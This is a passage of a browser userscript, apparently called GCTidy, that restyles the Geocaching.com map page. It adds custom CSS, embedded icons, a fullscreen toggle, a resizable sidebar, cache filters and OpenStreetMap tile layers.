			{name: 'label_type', type: 'string', defaultValue: 'number'},
			{name: 'sort_by', type: 'string', defaultValue: 'distance'},
			{name: 'sort_by_gcvote', type: 'bool', defaultValue: true},
			{name: 'gcvote', type: 'bool', defaultValue: true}
		],
		STYLE:
			'html, body {overflow: hidden;}' +
			'body {padding-bottom: 0;}' +
			'#bd {background: white;}' +
			'#ft {display: none;}' +
			'#Content {padding-bottom: 17px;}' +
			'#Navigation ul {position: relative;}' +
			'#Navigation ul, .BanManWidget {display: none;}' +
			'#MapOptions li:nth-child(1), #MapOptions li:nth-child(2) {display: none;}' +
			'#lblMapContent {margin-left: -12.4em;}' +
			'#lblMapContent #tdContent + td {display: none;}' +
			'#map-content {height: auto !important; position: relative;}' +
			'#map {border: none; position: relative; width: auto; height: 875px;}' +
			'#map > div > div > div:nth-child(7) span {position: absolute; top: -8px; left: 2px;}' + // GC Vote stars
			'#gctidy-map-type-control {right: 43px !important;}' +
			'.LabeledMarker_markerLabel {font-family: Tahoma, Helvetica, sans-serif; font-size: 85%; padding: 0px 2px 1px 3px; margin-top: 2px; white-space: nowrap; border-color: #555;}' +
			'.LabeledMarker_markerLabel b {font-weight: normal;}' +
			'#gctidy-toggle-fullscreen-resize-sidebar {width: 32px; height: 27px; position: absolute; top: 0; right: 0; background: white; -webkit-border-bottom-left-radius: 6px; -moz-border-radius-bottomleft: 6px; -webkit-box-shadow: #999 -1px 1px 2px; -moz-box-shadow: #999 -1px 1px 2px;}' +
			'#gctidy-toggle-fullscreen {padding: 5px 0 8px 6px; opacity: 0.4; cursor: pointer;}' +
			'#gctidy-toggle-fullscreen:hover {opacity: 1;}' +
			'#gctidy-resize-sidebar {float: right; padding: 5px 2px 6px; margin-right: -2px; cursor: e-resize;}' +
			'#gctidy-resize-sidebar div {float: left; height: 16px; width: 1px; border-right: 1px solid #ccc;}' +
			'#uxSideBar {padding-left: 1.3em;}' +
			'#uxSideBar label {font-weight: normal;}' +
			'#uxSideBar .gctidy-widget {padding: 0 0.5em 0.5em; margin-top: 0.9em; background-image: -webkit-gradient(linear, left top, left bottom, from(#f8f8f8), to(#f2f2f2)); background-image: -moz-linear-gradient(center top, #f8f8f8, #f2f2f2); -webkit-border-radius: 6px; -moz-border-radius: 6px; border-left: 1px solid #eee; border-top: 1px solid #eee; border-bottom: 1px solid #d2d2d2; border-right: 1px solid #d7d7d7;}' + // from(#fbfbfb), color-stop(0.7, #f7f7f7), color-stop(0.97, #f5f5f5), to(#eee)
			'#uxSideBar .gctidy-widget-header {cursor: pointer;}' +
			'#uxSideBar .gctidy-widget-header {padding: 0.6em 0.5em 0.2em;}' +
			'#uxSideBar .gctidy-widget-header img.gctidy-opened, #uxSideBar .gctidy-widget-header img.gctidy-closed {vertical-align: baseline; padding-right: 5px;}' +
			'#uxSideBar .gctidy-widget img.gctidy-closed {display: none;}' +
			'#uxSideBar .gctidy-widget.gctidy-closed {padding-bottom: 0;}' +
			'#uxSideBar .gctidy-widget.gctidy-closed > * {display: none;}' +
			'#uxSideBar .gctidy-widget.gctidy-closed .gctidy-widget-header {display: block; padding-bottom: 0.7em;}' +
			'#uxSideBar .gctidy-widget.gctidy-closed img.gctidy-opened {display: none;}' +
			'#uxSideBar .gctidy-widget.gctidy-closed img.gctidy-closed {display: inline;}' +
			'#uxSideBar .gctidy-widget.gctidy-closed #gctidy-filter-select {display: none;}' +
			'#uxSideBar .gctidy-widget.gctidy-closed #gctidy-filter-summary {display: block;}' +
			'#uxZoomToAddress.gctidy-widget {margin-top: -104px;}' +
			'#uxZoomToAddress p {padding: 0.4em 0.4em 0.4em;}' +
			'#txtGeocode {width: 80%; margin-right: 0.3em;}' +
			'#btnGeocode {width: 16.5%;}' +
			'#uxPocketQueryHomePage {margin-top: -110px;}' +
			'#uxPocketQueryHomePage p {margin: 1em 0 1.25em;}' +
			'#uxPremiumFeatures {padding:0; margin: 0; border-color: #C0CEE3; border-width: 0;}' +
			'#gctidy-filter-select {float:right; font-size: 85%; margin-top: -0.7em; padding: 0.9em 0 0.25em; cursor: default; color: #777;}' +
			'#gctidy-filter-summary {float: right; font-size: 85%; margin: 0.25em 0 0 1em; display: none;}' +
			'#gctidy-filter-summary img {vertical-align: -1px; margin-left: 2px;}' +
			'#gctidy-filter-summary-type {margin-right: 5px;}' +
			'#filterLegend p {padding: 0.65em 0.4em 0.4em; overflow: hidden; margin: 0; border-bottom: 1px solid #ddd; border-top: 1px solid white; line-height: 1.5;}' +
			'#filterLegend p#gctidy-premium-member {padding-top: 0; margin-top: 0; border-top: none;}' +
			'#filterLegend p:last-child {border-bottom: none;}' +
			'#filterLegend a:visited, #gctidy-search-tools a:visited, #gctidy-filter-select a:visited {color: #039;}' +
			'#filterLegend #gctidy-type-filter {padding-top: 0.9em;}' +
			'#filterLegend #gctidy-type-filter label {display: block; padding-bottom: 4px;}' +
			'#filterLegend #gctidy-status-filter {padding-bottom: 0.2em;}' +
			'#filterLegend #gctidy-status-filter img {padding-left: 0.3em; padding-top: 0.1em;}' +
			'.FilterContainer {margin-right: 8px; margin-bottom: 0.65em;}' +
			'.FilterContainer:last-child {margin-right: 0;}' +
			'.FilterContainer input {margin: 0 0.1em;}' +
			'#gctidy-premium-member {font-size: 85%;}' +
			'#gctidy-search-tools {margin: 1.5em 0 0;}' +
			'#gctidy-search-tools label {padding-left: 0.35em;}' +
			'#gctidy-search-tools input {margin-left: 0.1em; margin-right: 0;}' +
			'#gctidy-search-results {margin: 1.25em 0 -0.2em; position: relative;}' +
			'#gctidy-search-results-count {line-height: 1.2;}' +
			'#gctidy-search-results-count img {float: left; margin: 0.35em 0.6em 0 0; opacity: 0.4;}' +
			'#gctidy-search-results-count small {color: #999; font-size: 85%;}' +
			'#gctidy-search-results-count #spanCacheCount {font-size: 145%;}' +
			'#gctidy-search-results-sort {position: absolute; right: 0em; bottom: -0.1em; font-size: 85%;}' +
			'#GCVoteWaitMap {vertical-align: bottom; margin-left: 4px;}' +
			'#cacheListBounding {width: 306px; margin: 1em 0 0; border: none; border-top: 1px solid #d7d7d7; border-bottom: 1px solid #d7d7d7;}' +
			'#cacheListTable {border: none;}' +
			'#cacheListTable thead {display: none;}' +
			'#cacheListTable td {border-left: none; border-right: none;}' +
			'#cacheListTable tr:last-child td {border-bottom: none;}' +
			'#cacheListTable td:nth-child(1) {display: none; padding-right: 0.5em !important; text-align: right;}' +
			'#cacheListTable.gctidy-number-label td:nth-child(1) {display: table-cell;}' +
			'#cacheListTable td:nth-child(1), #cacheListTable td:nth-child(2) {padding-left: 0 !important;}' +
			'#cacheListTable td:nth-child(4) > span {display: block;}' + // GC Vote stars
			'#cacheListTable td:nth-child(4) > span img {vertical-align: baseline;}' +
			'#cacheListTable td:nth-child(4) > span span {white-space: nowrap;}' +
			'.gctidy-drop-shadow {display: none; position:absolute;}' +
			'#gctidy-drop-shadow-h {left: 0; width: 100%;}' +
			'#gctidy-drop-shadow-v {top: 27px; right: 0; bottom: 0;}' +
			'.gctidy-drop-shadow div {position: absolute; top: 0; background: black;}' +
			'#gctidy-drop-shadow-h div {left: 0; width: 100%;}' +
			'#gctidy-drop-shadow-v div {top: 0; right: 0; bottom: 0;}' +
			'.gctidy-fullscreen-map {padding: 0; overflow: hidden;}' +
			'.gctidy-fullscreen-map .gctidy-fullscreen-map-hide {display: none;}' +
			'.gctidy-fullscreen-map .gctidy-drop-shadow {display: block;}' +
			'.gctidy-fullscreen-map #fdbk_tab, .gctidy-fullscreen-map #Navigation, .gctidy-fullscreen-map #ft {display: none;}' +
			'.gctidy-fullscreen-map #doc3 {margin: 0;}' +
			'.gctidy-fullscreen-map #Content {padding: 0;}' +
			'.gctidy-fullscreen-map #uxSideBar {padding-left: 0;}' +
			'.gctidy-fullscreen-map #lblMapContent {margin-left: -13.3077em; margin-top: 0;}' +
			'.gctidy-fullscreen-map #gctidy-search-tools, .gctidy-fullscreen-map #cacheListBounding, .gctidy-fullscreen-map #gctidy-search-results {margin-left: 1em;}' +
			'.gctidy-fullscreen-map #uxSideBar .gctidy-widget {margin-left: 1em; margin-right: 1em;}' +
			'.gctidy-fullscreen-map #uxSideBar #uxZoomToAddress.gctidy-widget {margin-top: 0.9em;}' +
			'.gctidy-fullscreen-map #uxPocketQueryHomePage {margin-top: 0;}' +
			'.gctidy-fullscreen-map #uxPocketQueryHomePage p {margin-left: 1em;}' +
			'.gctidy-fullscreen-map #map {height: 1028px;}' +
			'.gctidy-fullscreen-map #gctidy-search-results-sort {right: 1.2em;}' +
			'.gctidy-fullscreen-map #cacheListBounding {padding-right: 1.2em; border-bottom: none;}' +
			'.gctidy-fullscreen-map #cacheListTable td:nth-child(4) {padding-right: 0 !important;}' +
			'.gctidy-fullscreen-map #cacheListTable td:last-child {padding: 0 !important;}' +
			'.gctidy-fullscreen-map.gctidy-sidebar-hidden #gctidy-drop-shadow-v {display: none;}' +
			'.gctidy-fullscreen-map.gctidy-sidebar-hidden #gctidy-toggle-fullscreen-resize-sidebar {width: 34px;}' +
			'.gctidy-fullscreen-map.gctidy-sidebar-hidden #gctidy-resize-sidebar {margin-right: 0;}' +
			'.gctidy-fullscreen-map.gctidy-sidebar-hidden #hmtctl {right: 45px !important;}' +
			'.gctidy-sidebar-hidden #gctidy-resize-sidebar {cursor: w-resize;}' +
			'input.Radio, input[type="radio"], input.Checkbox, input[type="checkbox"] {top: 2px; vertical-align: baseline;}' + 
			'input.Radio + label, input[type="radio"] + label, input.Checkbox + label, input[type="checkbox"] + label {vertical-align: baseline;}' + 
			'',
		IMAGES: {
			fullscreenIcon: 'data:image/gif;base64,R0lGODlhEAAQAIABAAAAABgjOSH5BAEAAAEALAAAAAAQABAAAAIijI+pywEP4QKzKnptwhtFeXBOF3qkIYrOZ7Ya2nxPQ9dNAQA7',
			magnifierIcon: 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAG6SURBVHjajFNNSwJRFD1johEGEyqkq1Ao2xnjH3A7C/dBi9w8wf9gUf6EVjMQEUjtWgS5NYRaORQY7VymJCKB6eAX07tPxz5whg4c7rtz7px335s7kqZpmGOf84BTnedlzhLnNSWMMSyDdzKZUDwNhUIFRVEQj8eF0Gg0VMMw1E6ns8vTIzjAMx6P92VZLmQyGbR9MegGkNOB8+c46BlpVONoMBqNDpLJJJ7aPvTHEpgCaLzb7TBv624VpFGNk4F3OByq1PbliwetFvDwCjSbMzEYhDgS1bgZYDqdiiQSwSKSid8PoVGNm0G5Xq+rifAe3k0fYhszIbACbK6NwDUyKDsa8POVKpWKms1uAZYMo+UXQkIeYifwgYubCt1BKUe3uwz5fJ54WiwWrWq1anW7XUFa0zMCnxUK+Eum1SD9GBCnQbqiGj4T9InvaxpL2y+IrpY52zw8e5ztxJh1fPsmqLDvbkj3wAWmaYpIO1MH9kincrpl6143g8GgL6JV09JSKmdFo9FfJuvrAcm1g35/sFhzE0nXdT5sLT4jTWHS631a/zqCkwlBostwQor+qjnsO7C95vHkS4ABAAYTF5WHAa1AAAAAAElFTkSuQmCC',
			filterIcon: 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAG1SURBVHjajJO/asJwEMfPoiCKGoQsFYdalwziYBxcBJ0cu/gGPoRbzea7+AJuTRdBDGKnLNW6WATF/4r/07urkQRT6cE3l9yfT+5HLi7DMKBWqz0DgIxKoiTUE+oRJcCvzVDfqC+UjvpAacViseum7Pl8/hQEAUKhEAQCAfD7/eD1esHj8XD34XAQt9utuF6vk8vl8mU+n8NsRkxwMeB0OkE8HufiwWAAnU6H/WQy4Vg4HIZIJALRaJS9KIrQbDY5ZwJyjUbjrVAoQDAYBEmS4J7V63VyOStARacg5FWWZVsxxsDn8zGYfK/Xo3oFU9QDD3Q5Ho+QzWYro9EIhsMh7Ha7q6y2Wq2Azp9IJCrUYwNQMfpcq9X6E6DrOteYPTbAfr+HTCaj4r2iaRo/k0zrdrtUp6TTafUGgJ+JAySEVMbjMZDMos1mA9PplHMmkHpsE6RSKVYsFuMx2+329e39fv86umk3R7BaqVSiozDsAoR8Pq/+G0AjU4y8U/4GQJtotcViwTHyTnlrzBFAb6aYOcE9gPteAS0WfY3L5jkCXPQ7l8tlp5U3Luv6jqo4FVSrVfgRYAAz4TYW5qhaOwAAAABJRU5ErkJggg==',
			unfoundIcon: 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAGwSURBVHjapFO5igJBEK2R8cCbEQ9MDQSz+QGNNDJdEDYev2EjA6P9hjVeEDY10sgvEAwEMREEUTzwwgOvrVer7gTiwtpQdE33e6/rdfUo5/OZnhkKBNJfafNagiPHkeXQL2sNjgpHmaN1BdZeaqQiOZ1OlMlkqFqtGlartRiNRiPhcJj8fr8AZ7OZPhwO9X6/b+z3+wJjS4z9rSD1mUJueDyej3g8ToFA4G65k8mE2u02LZfLPH+W6q91smDjeDwmLBZLMRaLkc/no8PhcDewBwyw4IArAlxWLhgMRrxeL/KHAQyw4NwEWD2raRrtdrs/BYABFhxw1UsF+mg0om63S06nk/guZLbb7eIdpPV6De8yu1wu4ZgFcA+0WCxoPB4/7LvNZiOHwyEcs0CDT9Phb7VaPRRwu91SGTg3AfZT4R7roVCIFEWRG783VFUVa4wVjrmCcq/XM7iCCPxBAI/LPLh1IrDZbIixA3BuXWD/re12W7g8EvGJMjGbc+wBAyw45jZSMpks8ZPNN5vNQafTofl8LqcikGMNe8AAe7UpT1l70/71M03fpz8Cz4xvAQYAHp8zlM5JwIsAAAAASUVORK5CYII=',
			disabledIcon: 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAJFSURBVHjapJO/T1pRFMe/Dx7ypEXri4lUGUhsHF40hODSpQ61cTH+2HSoZaF1dHSxpU7+Ca04NE7dyuBiapcuLFokTdD4A01awNdBSkAf8ut5zhUoxq3e5OS+nPv5nnvuyfdJpmniPksSBd68aM1pFDMU4xS+ei5GsUHxmSLRJD9+hcx7rVqFZWwMtc3NIGy2Zam31yX19ABdXTdgNuszdd1nptNBlMtviQ0TC0ujg1LgGWNByelctQ4M4G8qhfN4HLmDA6HvpJzq9eJRXx+qlDPz+deUDrd9+i6KoFouazVg2erx4M/uLn5FItGLk5NX/qUliYO+I2o2C4vLBWaYZQ1rRYFyqTQDVXXl02mcb29HbXb7S+/CwjqKRSAaDXlHRqYwOoqdxUUww6zQNApUSqVxuaMDF8kk2hTlgxYIHMMwaHSxEB2/a4g7u7sjzDDLmn8dXF35ZJsNVWrzycTEOtxuYH//lpjWezqbZoZZ1rQ+AXyj3eEQO7a27oj9s7OhVkZoWjqIFXUdD1QVub29L3fEk5MhXF7y2RwzzLKmdQYb+UwGiqLwO6duiVdWxM2GrvfTfOaZYZY1TScmvE7NKsvf3B6PyzE8jB9ra6DJR2TTnBYXSNIcbfN021Mjl8Pv09OzaqXyXIvnE6LAT00RRlLa21cfk1kesgNpULBab5xITiUHokADzJDJioYhjDSUKNafUKlgaHAwXCCHJQ8Pz1JHRyhQm2RhEfzNOT5jhlnWNJ+w0y/918/kPzbrf+M91rUAAwCuQDz94e2kLwAAAABJRU5ErkJggg==',
			foundIcon10px: 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAoAAAAKCAYAAACNMs+9AAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAEFSURBVHjaYry7igEGIoE4Boi9oPxtQLwEiJeDOCx//oAFmzhEDGsFVKIZ+BQDwQKf7q/3+nBnqdePN+c1gdw6xisLGSK5RHSWSVs2MLDxSDMgg19fnjI8Pd7A8O3NlSimX78YYvjl7BjYWP8wzMqxZGD4+RCMQWyQGEgOpIbx+BSG/xZhTQz4wIlVdQwsP38CWd9v4lUIUsMEJLY9u3kMqPgWw+ppS8E0MhskB1LDArR/yf0bT7wEeD4xGBszMMzqOw02xcWFgeHbu3sM9298ArlxCXOoNcOVr1//Mb9/+91eWJiBwcmJAazh82cGhquXvzO8efOv+d8/hsmMq8qJC3CAAAMA61R0O5fDnewAAAAASUVORK5CYII=',
			ownedIcon10px: 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAoAAAAKCAYAAACNMs+9AAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAD4SURBVHjaYrm7igEd/IfSjMiCTH/+MDAohd4FYyC7gV8znwGEQWwkcQam378RuoDsemGdPAYQBrGRxBlYfv1i2H9+jrIDSEBSP5GB4ddTsKSwZiIDUBzmjAOMx6cw/LfIvsvA8HE/A1bA78hwYqoyA+OBXgaQafsVdCwY5HXMUdQ8vHKS4cGVEyCmI8vPnwwHgIzG149u1MsrcaIoBIoxAOUbQVaD3AgC9opKLAwM328xvH39E+JGUXYGkNiLpwz2ID4L1NcOwvxvGG5cYmC4fh1sA4OmJoODhgbYx2CPMq4qBysE+QQkALKmAWoziAYFEUijI0CAAQDkpFzX1sj/9wAAAABJRU5ErkJggg==',
			unfoundIcon10px: 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAoAAAAKCAYAAACNMs+9AAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAEGSURBVHjajJA9aoVAEMdHd5GHimhlsXiAgDdI8ZpXbZH+gfdIlRTJDZIrPAjkAJ4kVRQsxEIbLfzADyQzwyssM/Bn+c/8dmYY4/J9gXtcUQlK332KuqG+yMht2+h9833/JYoiUEoxVVWVLstSd133gPZVqCd19TzvI45jQBj2fWc5jsO+bdvzOI6/clmWJAxDEELAPM9wDMpRrWmaRGJR4w/Isoy7uK7LUN/3MAwDGIZBDTSBQCCO4PcYtm1DEAQ8icB0XVdN+1iWxftRmKbJINYITE3c8VYUBUgpefmjKEc1YsTp8fQzTZPAM5ypC16Au9V1DXmeA+bfccqnETwH/zr4nwADAJ/LgXQQOhtNAAAAAElFTkSuQmCC',
			disabledIcon10px: 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAoAAAAKCAYAAACNMs+9AAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAEMSURBVHjaYvyf5sIABZFAHAPEXlD+NiBeAsTLQRyWP79/g+imr58+1b599ozh/cuXYFWC4uJechoaIE2aQFzH8vvnz8gfX7/Wvnr8+C8bB8c+47v/3cAq013//2Fm/vn748daIO86068fP2I+v3/PwMHNvU/x6HO4IgZBQYaLO3eyv37yhAGkhvGlp/p/oIkMQGsYoW4DKzq7ejUD0HTGR/ay/4GGMDD9/PaNgZOHhwGbIpAASA6khunn9+/b0BUBAVjRGx+tXSAapAbkxiUgd7x59+4nsqJ3/rq7gFY6gdwPUgPyNSicNJ9evlyrpKsLCpb/IIWgYHpx/z4DMNiaQWHJeEaJgagABwgwAOIEi4g4/hYaAAAAAElFTkSuQmCC'
		},
		process: function() {
			this.fullscreen = false;
			this.sideBarHidden = false;
			this.windowHeight = null;
			this.labelType = null;
			this.labelTypeSelectBox = null;
			this.sortBy = null;
			this.sortByGCVote = null;
			this.sortBySelectBox = null;
			
			$('#Content .yui-g:eq(1) h2:first')
				.css({'margin-top': '0.4em', 'padding-bottom': '0.1em'})
				.next('p').hide();

			$('#Content .yui-g:eq(0)').addClass('gctidy-fullscreen-map-hide');
			$('#lblMapContent').prevAll().addClass('gctidy-fullscreen-map-hide');
			
			$('#Navigation .MainLogo').gctidyTooltip($('#Navigation ul'), {tooltipHover: true, fadeIn: 50, fadeOut: 50});
			$('#map-content, #uxSideBar').removeAttr('style');

			this.processMap();
			this.processZoomToAddress();
			this.processFilter();
			this.processSearchResults();
			this.processWidgets();
			
			this.appendScript();
			
			// GC Vote, GC Tour, GC Google Map Enhancements
			this.checkForScripts();
			
			// Zapp
			if (zapp) {
				GCTidy.appendScript('text', 'if(!pm) {pm = true; buildPMFilter();}');
			}

			// Window resize
			$(document).gctidyWindowResize($.proxy(this.onWindowResize, this));

			// Fullscreen + Sidebar
			$('<div id="gctidy-toggle-fullscreen-resize-sidebar"></div>')
				.appendTo('#map-content')
				.append('<div id="gctidy-resize-sidebar" title="Click to toggle side bar"><div></div><div></div><div></div></div>')
				.append('<img id="gctidy-toggle-fullscreen" src="' + this.IMAGES.fullscreenIcon + '" title="Toggle fullscreen">');

			$('#gctidy-toggle-fullscreen')
				.click($.proxy(this.onToggleFullscreen, this));
			$('#cacheListBounding')
				.css('width', this.get('sidebar_width'))
				.gctidyHorizontalResizer({
					resizer: $('#gctidy-resize-sidebar'),
					onToggle: $.proxy(this.onToggleSideBar, this),
					onResize: $.proxy(function(pageX, offsetX, startX) {
						if (!this.sideBarHidden) {
							$('#cacheListBounding').css('width', Math.max(240, offsetX - pageX + 2 * startX) + 'px');
							this.adjustCacheListHeight();
						}
					}, this),
					onResizeEnd: $.proxy(function(width) {
						this.set('sidebar_width', width);
						GCTidy.appendScript('text', 'map.checkResize();');
						this.adjustMapTypeControlPosition();
					}, this)
				});
			if (this.get('fullscreen')) {
				this.onToggleFullscreen();
			}
			if (this.get('sidebar_hidden')) {
				this.onToggleSideBar();
			}
			
			// Drop shadow
			$('<div id="gctidy-drop-shadow-h" class="gctidy-drop-shadow"></div>')
				.css('top', $('#bd').offset().top - $('#doc3').offset().top)
				.appendTo('body')
				.append('<div style="opacity: 0.02; height: 5px;"></div>')
				.append('<div style="opacity: 0.04; height: 4px;"></div>')
				.append('<div style="opacity: 0.06; height: 3px;"></div>')
				.append('<div style="opacity: 0.08; height: 2px;"></div>')
				.append('<div style="opacity: 0.1; height: 1px;"></div>');
			$('<div id="gctidy-drop-shadow-v" class="gctidy-drop-shadow"></div>')
				.appendTo('#map-content')
				.append('<div style="opacity: 0.1; width: 2px;"></div>');
				
			// Print style
			$('<style media="print" type="text/css"></style>')
				.append(
					'.gctidy-widget, .gctidy-drop-shadow, .gctidy-fullscreen-map-hide, #gctidy-toggle-fullscreen-resize-sidebar, #gctidy-search-tools, #gctidy-open-configuration, #fdbk_tab {display: none !important;}' +
					'.LabeledMarker_markerLabel {background: white;}' +
					'#cacheListTable td {font-size: 90%;}'
				)
				.appendTo('head');
		},
		processMap: function() {
			// Map
			if (!this.get('add_osm')) {
				return;
			}
			GCTidy.appendScript('text',
				'setTimeout(function() {' + 
				'	function OSMCopyright(a,b) {' + 
				'		return {' +
				'			prefix: \'Map data <a href="http://creativecommons.org/licenses/by-sa/2.0/">CCBYSA</a> 2010 <a href="http://www.openstreetmap.org/">OpenStreetMap.org</a> contributors\',' + 
				'			copyrightTexts: [""]' + 
				'		};' + 
				'	}' +
				'' +
				'	var tilesMapnik = new GTileLayer(new GCopyrightCollection("OSMMapnik"), 0, 17, {isPng: true});' + 
				'	tilesMapnik.getCopyright = OSMCopyright;' + 
				'	tilesMapnik.getTileUrl = function(point, zoom) {' +
				'		return "http://" + ["a", "b", "c"][(point.x+point.y)%3] + ".tile.openstreetmap.org/" + zoom + "/" + point.x + "/" + point.y + ".png";' + 
				'	};' + 
				'	var mapMapnik = new GMapType([tilesMapnik], new GMercatorProjection(18), "OSM Road");' + 
				'	map.addMapType(mapMapnik);' +
				'' +
				'	var tilesCycle = new GTileLayer(new GCopyrightCollection("OSMCycle"), 0, 17, {isPng: true});' + 
				'	tilesCycle.getCopyright = OSMCopyright;' + 
				'	tilesCycle.getTileUrl = function(point, zoom) {' +
				'		return "http://" + ["a", "b", "c"][(point.x+point.y)%3] + ".andy.sandbox.cloudmade.com/tiles/cycle/" + zoom + "/" + point.x + "/" + point.y + ".png";' + 
				'	};' + 
				'	var mapCycle = new GMapType([tilesCycle], new GMercatorProjection(18), "OSM Cycle");' + 
				'	map.addMapType(mapCycle);' +
				'}, 0);' +
				''
			);
		},
		processZoomToAddress: function() {
			var zoomToAddress = $('#uxZoomToAddress').addClass('gctidy-widget');
			zoomToAddress.find('strong')
				.text(zoomToAddress.find('strong').text().replace(/:/, ''))
				.next('br').hide().end()
				.prependTo(zoomToAddress)
				.wrap('<div class="gctidy-widget-header"></div>')
				.before('<img src="' + this.IMAGES.magnifierIcon + '" style="margin: 0px 0px -2px 0px; padding: 2px 4px 0px 2px;">');
		},
		processFilter: function() {
			var filter = $('#uxPremiumFeatures').addClass('gctidy-widget');
			filter.find('p:first').prependTo('#filterLegend').attr('id', 'gctidy-premium-member');
			filter.find('p:first strong').hide().next('span').prepend('Premium Member only ');
			filter.find('p:empty').hide();
			filter.find('div[class="Clear"]').remove();
			var filterHeader = $('<div class="gctidy-widget-header"><img src="' + this.IMAGES.filterIcon + '" style="padding: 1px 4px 0px 2px;"><strong>Filter</strong></div>')
				.prependTo(filter);
			
			// Cache type filter
			var typeFilter = $('#filterLegend p:eq(1)').attr('id', 'gctidy-type-filter');
			typeFilter.find('.FilterContainer').each(function() {
				$(this).find('label').prependTo(this);
			});
			typeFilter.find('.FilterContainer:has(#chkLegend8)').insertAfter('.FilterContainer:has(#chkLegend3)');
			typeFilter.find('.FilterContainer:has(#chkLegend6)').insertAfter('.FilterContainer:has(#chkLegend8)');
			typeFilter.find('.FilterContainer:has(#chkLegend137)').insertAfter('.FilterContainer:has(#chkLegend6)');
			
			// Select all/none
			var typeFilterSelect = $('<div id="gctidy-filter-select">Select: <a id="gctidy-select-all" href="#">All</a> <a id="gctidy-select-none" href="#">None</a></div>')
				.prependTo(filterHeader);
			typeFilterSelect.find('#gctidy-select-all, #gctidy-select-none')
				.click($.proxy(function(event) {
					var checked = $(event.target).attr('id') == 'gctidy-select-all';
					typeFilter.find('input')
						.attr('checked', checked)
						.each(function() {
							settings[this.id] = checked;
						});
					this.saveFilterSettings(settings);
					GCTidy.appendScript('text',
						'GCTidy.toggleCacheVisibility();' +
						'GCTidy.updateSideBarList();'
					);
					return false;
				}, this));
				
			// Filter summary
			var filterSummary = $('<div id="gctidy-filter-summary"><span id="gctidy-filter-summary-type"></span></div>')
				.prependTo(filterHeader)
				.append('<img id="gctidy-filter-summary-chkHideFound" src="' + this.IMAGES.foundIcon10px + '">')
				.append('<img id="gctidy-filter-summary-chkHideOwned" src="' + this.IMAGES.ownedIcon10px + '">')
				.append('<img id="gctidy-filter-summary-chkHideUnfound" src="' + this.IMAGES.unfoundIcon10px + '">')
				.append('<img id="gctidy-filter-summary-chkHideDisabled" src="' + this.IMAGES.disabledIcon10px + '">');
			
			var personalizationUnavailable = $('#filterLegend .FilterContainer a#lnkViewMapBeta2').parent();
			if (personalizationUnavailable.length) {
				personalizationUnavailable
					.removeClass('FilterContainer')
					.css({'display': 'block', 'padding': '0.5em 0 0 0.4em', 'font-size': '85%'});
				var statusFilter = $('<p id="gctidy-status-filter" style="border-bottom: none;"></p>')
					.insertBefore(personalizationUnavailable);
			}
			else {
				// Cache status filter
				var statusFilter = $('#filterLegend p:has(#chkHideFound)').attr('id', 'gctidy-status-filter');
			}
			$('<span class="FilterContainer" style="margin-bottom: 0"></span>')
				.appendTo(statusFilter)
				.append('<input type="checkbox" id="chkHideUnfound" class="Checkbox">')
				.append('<label for="chkHideUnfound" title="Hide Unfound Caches" class="NoBolding"></label>')
				.find('label').append('<img src="' + this.IMAGES.unfoundIcon + '" alt="Hide Unfound Caches"> Hide Unfound Caches');
			$('<span class="FilterContainer" style="margin-bottom: 0"></span>')
				.appendTo(statusFilter)
				.append('<input type="checkbox" id="chkHideDisabled" class="Checkbox">')
				.append('<label for="chkHideDisabled" title="Hide Disabled Caches" class="NoBolding"></label>')
				.find('label').append('<img src="' + this.IMAGES.disabledIcon + '" alt="Hide Disabled Caches"> Hide Disabled Caches');
	
			if (personalizationUnavailable.length) {
				// Create pocket query
				statusFilter.parent().find('a[href="../pocket/default.aspx"]').parent('span')
					.prependTo(statusFilter)
					.removeClass('FilterContainer')
					.css({'float': 'right', 'font-size': '85%', 'margin': '0 0 0.4em 1em'})
					.find('img').remove();
			}
			else {
				// Create pocket query
				statusFilter.find('a[href="../pocket/default.aspx"]').parent('span')
					.prependTo(statusFilter)
					.removeClass('FilterContainer')
					.css({'float': 'right', 'font-size': '85%'})
					.find('img').remove();
			}
			
			// Settings
			var settings = this.loadFilterSettings();
			$.each(settings, function(id, checked) {
				$('#' + id).attr('checked', checked);
			});
			filter.find('input[type="checkbox"]')
				.click($.proxy(function(event) {
					var input = $(event.target);
					settings[input.attr('id')] = input.attr('checked');
					this.saveFilterSettings(settings);
				}, this));
		},
		loadFilterSettings: function() {
			var settings = {};
			$('#uxPremiumFeatures input[type="checkbox"]').each(function() {
				var input = $(this);
				settings[input.attr('id')] = input.attr('checked');
			});
			var settingsString = this.get('filter');
			if (settingsString) {
				$.each(settingsString.split(','), function(i, value) {
					var setting = value.split('=');
					if (typeof settings[setting[0]] !== 'undefined') {
						settings[setting[0]] = (setting[1] == 'true');
					}
				});
			}
			this.updateFilterSummary(settings);
			return settings;
		},
		saveFilterSettings: function(settings) {
			this.updateFilterSummary(settings);
			var settingsArray = [];
			$.each(settings, function(name, value) {
				settingsArray.push(name + '=' + value);
			});
